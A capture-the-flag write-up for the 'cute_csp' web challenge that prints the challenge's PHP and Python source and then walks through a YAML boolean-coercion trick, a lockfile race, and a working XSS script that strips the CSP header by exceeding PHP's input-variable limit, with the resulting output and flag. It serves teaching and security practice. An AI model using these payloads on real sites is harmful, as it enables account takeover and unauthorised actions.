# cute_csp

Co-authors: @ouuan @Hurrison

```
By Flagyard
WEB
So cute... so quirky...
```

The web server contains the following files, `index.php`:

```php
<?php
header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline; img-src *;");
@print($_GET["html"] ?? show_source(__FILE__));
```

It allows us to inject any HTML, but with CSP enabled. So we cannot execute arbitrary JS.

The second one is `report.php`:

```php
<?php
const URL_PREFIX =  "http://localhost:5000/index.php";

echo "<pre>";

$url = $_REQUEST['url'] ?? null;
if (isset($url) && str_starts_with($url, URL_PREFIX)) {
    $start_time = microtime(true);

    $url = escapeshellarg($url);
    system("python3 bot.py " . $url);

    echo "[xssbot] total request time: " . (microtime(true) - $start_time) . " seconds";
} else {
    echo "[!] Please provide a URL in the format ^" . URL_PREFIX . PHP_EOL;
}

echo "</pre>";
```

It executes `bot.py`, which is:

```python
import os
import sys
import asyncio
import traceback
from pathlib import Path
from playwright.async_api import async_playwright

BASE_URL = "http://localhost:5000"
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")
URL_PREFIX = "http://localhost:5000/index.php"

# makeshift lockfile, not safe against deliberate race conditions
LOCKFILE = Path("bot.lock")


async def visit(url: str):
    if LOCKFILE.exists():
        print("[xssbot] ongoing visit detected, cancelling...")
        exit(1)

    if not url.startswith(URL_PREFIX):
        print("[xssbot] invalid URL format")
        exit(1)

    try:
        Path(LOCKFILE).touch()
        print("[xssbot] visiting url")
        p = await async_playwright().start()

        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()

        await context.add_cookies(
            [
                {
                    "name": "token",
                    "value": ADMIN_TOKEN,
                    "domain": "localhost",
                    "httpOnly": True,
                    "path": "/",
                }
            ]
        )

        page = await context.new_page()

        await page.goto(url)
        await page.wait_for_load_state("networkidle")
        await page.wait_for_timeout(1_000)
        content = await page.evaluate("() => document.documentElement.innerHTML")
        print("-" * 32)
        print(content)
        print("-" * 32)

    except Exception:
        print("[xssbot] failed during visit:", traceback.format_exc())
    finally:
        LOCKFILE.unlink()
        print("[xssbot] complete")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[!] Invalid argument length")
        exit(1)

    url = sys.argv[1]
    asyncio.run(visit(url))
```

It opens the url with cookie, so we can access protected resources in `admin.php`:

```php
<?php
error_reporting(E_ALL ^ E_WARNING);

const URL_PREFIX =  "http://localhost:5000/admin.php";
const ISO3166_COUNTRY_NAMES = ['Aruba' => 'AW', 'Afghanistan' => 'AF', 'Angola' => 'AO', 'Anguilla' => 'AI', 'Åland Islands' => 'AX', 'Albania' => 'AL', 'Andorra' => 'AD', 'United Arab Emirates' => 'AE', 'Argentina' => 'AR', 'Armenia' => 'AM', 'American Samoa' => 'AS', 'Antarctica' => 'AQ', 'French Southern Territories' => 'TF', 'Antigua and Barbuda' => 'AG', 'Australia' => 'AU', 'Austria' => 'AT', 'Azerbaijan' => 'AZ', 'Burundi' => 'BI', 'Belgium' => 'BE', 'Benin' => 'BJ', 'Bonaire, Sint Eustatius and Saba' => 'BQ', 'Burkina Faso' => 'BF', 'Bangladesh' => 'BD', 'Bulgaria' => 'BG', 'Bahrain' => 'BH', 'Bahamas' => 'BS', 'Bosnia and Herzegovina' => 'BA', 'Saint Barthélemy' => 'BL', 'Belarus' => 'BY', 'Belize' => 'BZ', 'Bermuda' => 'BM', 'Bolivia, Plurinational State of' => 'BO', 'Brazil' => 'BR', 'Barbados' => 'BB', 'Brunei Darussalam' => 'BN', 'Bhutan' => 'BT', 'Bouvet Island' => 'BV', 'Botswana' => 'BW', 'Central African Republic' => 'CF', 'Canada' => 'CA', 'Cocos (Keeling) Islands' => 'CC', 'Switzerland' => 'CH', 'Chile' => 'CL', 'China' => 'CN', 'Côte d\'Ivoire' => 'CI', 'Cameroon' => 'CM', 'Congo, The Democratic Republic of the' => 'CD', 'Congo' => 'CG', 'Cook Islands' => 'CK', 'Colombia' => 'CO', 'Comoros' => 'KM', 'Cabo Verde' => 'CV', 'Costa Rica' => 'CR', 'Cuba' => 'CU', 'Curaçao' => 'CW', 'Christmas Island' => 'CX', 'Cayman Islands' => 'KY', 'Cyprus' => 'CY', 'Czechia' => 'CZ', 'Germany' => 'DE', 'Djibouti' => 'DJ', 'Dominica' => 'DM', 'Denmark' => 'DK', 'Dominican Republic' => 'DO', 'Algeria' => 'DZ', 'Ecuador' => 'EC', 'Egypt' => 'EG', 'Eritrea' => 'ER', 'Western Sahara' => 'EH', 'Spain' => 'ES', 'Estonia' => 'EE', 'Ethiopia' => 'ET', 'Finland' => 'FI', 'Fiji' => 'FJ', 'Falkland Islands (Malvinas)' => 'FK', 'France' => 'FR', 'Faroe Islands' => 'FO', 'Micronesia, Federated States of' => 'FM', 'Gabon' => 'GA', 'United Kingdom' => 'GB', 'Georgia' => 'GE', 'Guernsey' => 'GG', 'Ghana' => 'GH', 'Gibraltar' => 'GI', 'Guinea' => 'GN', 'Guadeloupe' => 'GP', 'Gambia' => 'GM', 'Guinea-Bissau' => 'GW', 'Equatorial Guinea' => 'GQ', 'Greece' => 'GR', 'Grenada' => 'GD', 'Greenland' => 'GL', 'Guatemala' => 'GT', 'French Guiana' => 'GF', 'Guam' => 'GU', 'Guyana' => 'GY', 'Hong Kong' => 'HK', 'Heard Island and McDonald Islands' => 'HM', 'Honduras' => 'HN', 'Croatia' => 'HR', 'Haiti' => 'HT', 'Hungary' => 'HU', 'Indonesia' => 'ID', 'Isle of Man' => 'IM', 'India' => 'IN', 'British Indian Ocean Territory' => 'IO', 'Ireland' => 'IE', 'Iran, Islamic Republic of' => 'IR', 'Iraq' => 'IQ', 'Iceland' => 'IS', 'Israel' => 'IL', 'Italy' => 'IT', 'Jamaica' => 'JM', 'Jersey' => 'JE', 'Jordan' => 'JO', 'Japan' => 'JP', 'Kazakhstan' => 'KZ', 'Kenya' => 'KE', 'Kyrgyzstan' => 'KG', 'Cambodia' => 'KH', 'Kiribati' => 'KI', 'Saint Kitts and Nevis' => 'KN', 'Korea, Republic of' => 'KR', 'Kuwait' => 'KW', 'Lao People\'s Democratic Republic' => 'LA', 'Lebanon' => 'LB', 'Liberia' => 'LR', 'Libya' => 'LY', 'Saint Lucia' => 'LC', 'Liechtenstein' => 'LI', 'Sri Lanka' => 'LK', 'Lesotho' => 'LS', 'Lithuania' => 'LT', 'Luxembourg' => 'LU', 'Latvia' => 'LV', 'Macao' => 'MO', 'Saint Martin (French part)' => 'MF', 'Morocco' => 'MA', 'Monaco' => 'MC', 'Moldova, Republic of' => 'MD', 'Madagascar' => 'MG', 'Maldives' => 'MV', 'Mexico' => 'MX', 'Marshall Islands' => 'MH', 'North Macedonia' => 'MK', 'Mali' => 'ML', 'Malta' => 'MT', 'Myanmar' => 'MM', 'Montenegro' => 'ME', 'Mongolia' => 'MN', 'Northern Mariana Islands' => 'MP', 'Mozambique' => 'MZ', 'Mauritania' => 'MR', 'Montserrat' => 'MS', 'Martinique' => 'MQ', 'Mauritius' => 'MU', 'Malawi' => 'MW', 'Malaysia' => 'MY', 'Mayotte' => 'YT', 'Namibia' => 'NA', 'New Caledonia' => 'NC', 'Niger' => 'NE', 'Norfolk Island' => 'NF', 'Nigeria' => 'NG', 'Nicaragua' => 'NI', 'Niue' => 'NU', 'Netherlands' => 'NL', 'Norway' => 'NO', 'Nepal' => 'NP', 'Nauru' => 'NR', 'New Zealand' => 'NZ', 'Oman' => 'OM', 'Pakistan' => 'PK', 'Panama' => 'PA', 'Pitcairn' => 'PN', 'Peru' => 'PE', 'Philippines' => 'PH', 'Palau' => 'PW', 'Papua New Guinea' => 'PG', 'Poland' => 'PL', 'Puerto Rico' => 'PR', 'Korea, Democratic People\'s Republic of' => 'KP', 'Portugal' => 'PT', 'Paraguay' => 'PY', 'Palestine, State of' => 'PS', 'French Polynesia' => 'PF', 'Qatar' => 'QA', 'Réunion' => 'RE', 'Romania' => 'RO', 'Russian Federation' => 'RU', 'Rwanda' => 'RW', 'Saudi Arabia' => 'SA', 'Sudan' => 'SD', 'Senegal' => 'SN', 'Singapore' => 'SG', 'South Georgia and the South Sandwich Islands' => 'GS', 'Saint Helena, Ascension and Tristan da Cunha' => 'SH', 'Svalbard and Jan Mayen' => 'SJ', 'Solomon Islands' => 'SB', 'Sierra Leone' => 'SL', 'El Salvador' => 'SV', 'San Marino' => 'SM', 'Somalia' => 'SO', 'Saint Pierre and Miquelon' => 'PM', 'Serbia' => 'RS', 'South Sudan' => 'SS', 'Sao Tome and Principe' => 'ST', 'Suriname' => 'SR', 'Slovakia' => 'SK', 'Slovenia' => 'SI', 'Sweden' => 'SE', 'Eswatini' => 'SZ', 'Sint Maarten (Dutch part)' => 'SX', 'Seychelles' => 'SC', 'Syrian Arab Republic' => 'SY', 'Turks and Caicos Islands' => 'TC', 'Chad' => 'TD', 'Togo' => 'TG', 'Thailand' => 'TH', 'Tajikistan' => 'TJ', 'Tokelau' => 'TK', 'Turkmenistan' => 'TM', 'Timor-Leste' => 'TL', 'Tonga' => 'TO', 'Trinidad and Tobago' => 'TT', 'Tunisia' => 'TN', 'Türkiye' => 'TR', 'Tuvalu' => 'TV', 'Taiwan, Province of China' => 'TW', 'Tanzania, United Republic of' => 'TZ', 'Uganda' => 'UG', 'Ukraine' => 'UA', 'United States Minor Outlying Islands' => 'UM', 'Uruguay' => 'UY', 'United States' => 'US', 'Uzbekistan' => 'UZ', 'Holy See (Vatican City State)' => 'VA', 'Saint Vincent and the Grenadines' => 'VC', 'Venezuela, Bolivarian Republic of' => 'VE', 'Virgin Islands, British' => 'VG', 'Virgin Islands, U.S.' => 'VI', 'Viet Nam' => 'VN', 'Vanuatu' => 'VU', 'Wallis and Futuna' => 'WF', 'Samoa' => 'WS', 'Yemen' => 'YE', 'South Africa' => 'ZA', 'Zambia' => 'ZM', 'Zimbabwe' => 'ZW', 'FLAG' => 'FL'];
$ADMIN_TOKEN = getenv('ADMIN_TOKEN');

$admin_token = $_COOKIE['token'] ?? null;

if ($_SERVER['REMOTE_ADDR'] <> '127.0.0.1' && (!isset($admin_token) || strcmp($admin_token, $ADMIN_TOKEN) <> 0)) {
    echo "[!] Oops! Invalid admin token";
    die(1);
}

switch ($_SERVER['REQUEST_METHOD']) {
    case 'GET':
        simulate_transactions();
        break;

    case 'POST':
        process_transactions();
        break;
}

/**
 *  we allow transaction simulation, just in case we do not wanna go ahead with that
 *  specific transaction processing
 */
function simulate_transactions()
{
    header('Content-Type: text/plain');

    if (!key_exists('transactions', $_GET) || !is_array($_GET['transactions'])) {
        echo "[!] Please provide the transactions array you wish to simulate." . PHP_EOL;
        return;
    }

    $buy = true;
    foreach ($_GET['transactions'] as $key => $tx) {
        if (!isset($tx['amount']) || !isset($tx['country'])) {
            echo "[!] Missing amount or country in transaction #$key" . PHP_EOL;
            return;
        }

        $amount = $tx['amount'];
        $country = $tx['country'];

        // validate the two fields
        if (!is_numeric($amount) || !array_key_exists($country, ISO3166_COUNTRY_NAMES)) {
            echo "[!] Invalid transaction amount or country in transaction #$key" . PHP_EOL;
            return;
        }

        $currency = ISO3166_COUNTRY_NAMES[$country];
        printf("- amount: %d\n  currency: %s\n  op: %s\n", intval($amount), $currency, $buy ? "BUY" : "SELL");

        // you cant keep buying, gotta switch it up, its no free economy in here...
        $buy = !$buy;
    }
}

/**
 *  we batch process all of our transactions based on simulation results; this 
 *  guarantees safety against race conditions and other wild stuff.
 */
function process_transactions()
{
    $url = $_REQUEST['url'] ?? null;

    if (!isset($url) || !str_starts_with($url, URL_PREFIX)) {
        echo "[!] Invalid simulation url: " . $url;
        return;
    }

    // TODO: We really need to support real exchange rates some day, it does not seem fair in its current
    // format. on the bright side, at least we are treating everybody equally :)
    $exchange_rates = [];
    foreach (ISO3166_COUNTRY_NAMES as $country => $currency) {
        $exchange_rates[$currency] = 1;
    }

    $exchange_rates['FL'] = 1_000_000;
    $balance = 1;

    echo "<pre>" . PHP_EOL;

    echo '11111' . PHP_EOL;
    echo "fgc" . file_get_contents($url) . PHP_EOL;
    echo '22222' . PHP_EOL;
    echo "url" . $url . PHP_EOL;
    echo '33333' . PHP_EOL;
    $txs = @yaml_parse_url($url);
    if ($txs === false || !is_array($txs)) {
        echo "[!] Failed to parse transactions from url";
        return;
    }

    $currency_inventory = [];

    echo "Transactions Processing Sheet\n--------------------------" . PHP_EOL;
    foreach ($txs as $i => $tx) {
        if (!is_array($tx)) {
            echo "[!] Transaction #{$i} must be an object";
            return;
        }

        if (!array_key_exists('amount', $tx) || !array_key_exists('currency', $tx) || !array_key_exists('op', $tx)) {
            echo "[!] Transaction #{$i} must include 'amount' and 'currency'";
            return;
        }

        $op = $tx['op'];
        $amount = $tx['amount'];
        $currency = $tx['currency'];

        if (!is_int($amount) || $amount <= 0) {
            echo "[!] Transaction #{$i} amount must be a positive integer";
            return;
        }

        if ($op <> 'BUY' && $op <> 'SELL') {
            echo "[!] Transaction #{$i} op must be either BUY or SELL";
            return;
        }

        if (!isset($currency_inventory[$currency])) {
            $currency_inventory[$currency] = 0;
        }

        $currency_rate = $exchange_rates[$currency];
        $value = $amount * intval($currency_rate);

        if ($op == 'BUY') {
            // do we have enough balance to cover this buy?
            if ($balance - $value >= 0) {
                $balance -= $value;
                $currency_inventory[$currency] += $amount;
            } else {
                echo "[!] Transaction #{$i} insufficient balance to BUY {$amount} {$currency}. "
                    . "Cost: {$value}, Balance: {$balance}";
                return;
            }
        } elseif ($op == 'SELL') {
            // do we have enough currency to sell?
            if ($currency_inventory[$currency] >= $amount) {
                $balance += $value ? $value : $amount;
                $currency_inventory[$currency] -= $amount;
            } else {
                echo "[!] Transaction #{$i} cannot SELL {$amount} {$currency}; "
                    . "inventory is {$currency_inventory[$currency]}";
                return;
            }
        } else {
            echo "[!] Transaction #{$i} op must be either BUY or SELL";
            return;
        }

        printf("%s %2dx %s (Rate: %.1f) = %3d\n", $op == 'BUY' ? '-' : '+', $amount, $currency, $currency_rate, $value);
    }

    foreach ($currency_inventory as $cur => $qty) {
        printf("Final Inventory %-5s : %s\n", $cur, $cur === 'FL' ? getenv('DYN_FLAG') : $qty);
    }

    echo PHP_EOL . "</pre>";
}
```

So the first part is, how to let `admin.php` prints flag? @ouuan gives the answer:

1. Utilize a feature of yaml that interprets `NO` as boolean type, instead of country code of `Norway`
2. So that the currency rate is 0, we can trade for any amount of `NO` currency
3. Finally buy the flag

Transactions:

```yaml
- amount: 1000000
  currency: NO
  op: BUY
- amount: 1000000
  currency: NO
  op: SELL
- amount: 1
  currency: FL
  op: BUY
```

Proof of concept:

```shell
$ curl --globoff -X POST "http://172.17.0.3:5000/admin.php?url=http://localhost:5000/admin.php?transactions[0][amount]=1000000%26transactions[0][country]=Norway%26transactions[1][amount]=1000000%26transactions[1][country]=Norway%26transactions[2][amount]=1%26transactions[2][country]=FLAG" -H "Cookie: token=44d1e1e870346643aca25763ce549552"
<pre>
11111
fgc- amount: 1000000
  currency: NO
  op: BUY
- amount: 1000000
  currency: NO
  op: SELL
- amount: 1
  currency: FL
  op: BUY

22222
urlhttp://localhost:5000/admin.php?transactions[0][amount]=1000000&transactions[0][country]=Norway&transactions[1][amount]=1000000&transactions[1][country]=Norway&transactions[2][amount]=1&transactions[2][country]=FLAG
33333
Transactions Processing Sheet
--------------------------
- 1000000x  (Rate: 0.0) =   0
+ 1000000x  (Rate: 0.0) =   0
-  1x FL (Rate: 1000000.0) = 1000000
Final Inventory 0     : 0
Final Inventory FL    : flag

</pre>
```

Since we don't have the cookie, we need to use the bot to do the POST in the server. However, the content security policy forbids javascript execution. How can we bypass it?

The first possible solution is from @ouuan:

- If `index.php` cannot provide us the html that can run javascript
- We can use `report.php` to generate html for us!
- However, `report.php` runs `bot.py`, which cannot be run simultaneously via:

```python
# makeshift lockfile, not safe against deliberate race conditions
LOCKFILE = Path("bot.lock")
```

But it is possible for race condition:

1. Run two bots in parallel, so that the lock file is created twice
2. The first bot stops, and removes the lock file
3. Use the second bot to send request to `report.php` to get the html with JS enabled

@ouuan successfully attacks both locally and remotely.

Another way to bypass CSP, is suggested by @Hurrison: when the HTTP request contains more than 1000 queries, it will fail:

```html
<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in <b>Unknown</b> on line <b>0</b><br>
<br>
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/index.php</b> on line <b>2</b><br>
```

Therefore the CSP header is missing. But, the html is still printed! We can bypass CSP limitation by simply adding many query parameters:

```python
import requests
from urllib.parse import quote

target = 'http://cmvkynvk.playat.flagyard.com'
#target = 'http://172.17.0.3:5000'

xss = quote("""
<script>
(async () => {
    const res = await fetch('http://localhost:5000/admin.php?url=http://localhost:5000/admin.php?transactions[0][amount]=1000000%26transactions[0][country]=Norway%26transactions[1][amount]=1000000%26transactions[1][country]=Norway%26transactions[2][amount]=1%26transactions[2][country]=FLAG', { method: 'POST', headers: {'Content-Type': 'text/plain'}});
    const data = await res.text();
    document.documentElement.innerHTML += data;
})();
</script>
""".strip())

exp = f'http://localhost:5000/index.php/?html={xss}&' + '&'.join([f'{i}=0' for i in range(1001)])

url = f'{target}/report.php'
data = {
    'url': exp
}
r = requests.post(url, data=data)
print(r.text)
```

Output:

```html
<pre>[xssbot] visiting url
--------------------------------
<head></head><body><br>
<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in <b>Unknown</b> on line <b>0</b><br>
<br>
<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/index.php</b> on line <b>2</b><br>
<script>
(async () => {
    const res = await fetch('http://localhost:5000/admin.php?url=http://localhost:5000/admin.php?transactions[0][amount]=1000000%26transactions[0][country]=Norway%26transactions[1][amount]=1000000%26transactions[1][country]=Norway%26transactions[2][amount]=1%26transactions[2][country]=FLAG', { method: 'POST', headers: {'Content-Type': 'text/plain'}});
    const data = await res.text();
    document.documentElement.innerHTML += data;
})();
</script><pre>Transactions Processing Sheet
--------------------------
- 1000000x  (Rate: 0.0) =   0
+ 1000000x  (Rate: 0.0) =   0
-  1x FL (Rate: 1000000.0) = 1000000
Final Inventory 0     : 0
Final Inventory FL    : BHFlagY{423f5511a87131df7a1061d09c40b7ec}

</pre></body>
--------------------------------
[xssbot] complete
[xssbot] total request time: 2.4307129383087 seconds</pre>
```

The flag is `BHFlagY{423f5511a87131df7a1061d09c40b7ec}`.
